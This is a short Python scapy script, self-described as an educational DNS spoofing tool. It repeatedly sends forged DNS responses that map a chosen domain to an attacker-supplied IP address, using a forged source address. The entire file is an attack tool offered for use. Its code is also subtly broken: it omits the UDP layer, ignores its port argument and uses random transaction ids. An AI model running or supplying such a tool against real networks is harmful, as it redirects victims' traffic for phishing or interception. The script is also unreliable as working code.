import argparse
from scapy.all import *
import random
import threading
import time

def spoof_dns(target_ip, fake_ip, target_port, victim_ip, domain):
    # Create an IP layer with source as victim_ip and destination as target_ip
    ip = IP(src=victim_ip, dst=target_ip)
    
    # Create a DNS layer with fake DNS response
    dns = DNS(id=random.randint(1, 65535), qr=1, qdcount=1, ancount=1, qd=DNSQR(qname=domain, qtype="A"))
    dns.an = DNSRR(rrname=domain, rdata=fake_ip)

    # Send the packet
    packet = ip/dns
    send(packet, verbose=0)
    print(f"Sent spoofed DNS response to {target_ip}, domain: {domain}, fake IP: {fake_ip}.")

def dns_spoofing(target_ip, fake_ip, victim_ip, target_port, domain):
    while True:
        spoof_dns(target_ip, fake_ip, target_port, victim_ip, domain)
        time.sleep(1)  # Add a small delay to control the rate of spoofing

def main():
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool for Educational Purposes")
    parser.add_argument("target_ip", help="The IP address of the target machine to spoof.")
    parser.add_argument("fake_ip", help="The fake IP address you want to provide for the spoofed domain.")
    parser.add_argument("victim_ip", help="The IP address of the victim machine.")
    parser.add_argument("target_port", type=int, help="Port number to target for DNS requests (usually 53).")
    parser.add_argument("domain", help="The domain you want to spoof (e.g., www.example.com).")

    args = parser.parse_args()

    # Start the DNS spoofing in a separate thread
    threading.Thread(target=dns_spoofing, args=(args.target_ip, args.fake_ip, args.victim_ip, args.target_port, args.domain)).start()

if __name__ == "__main__":
    main()
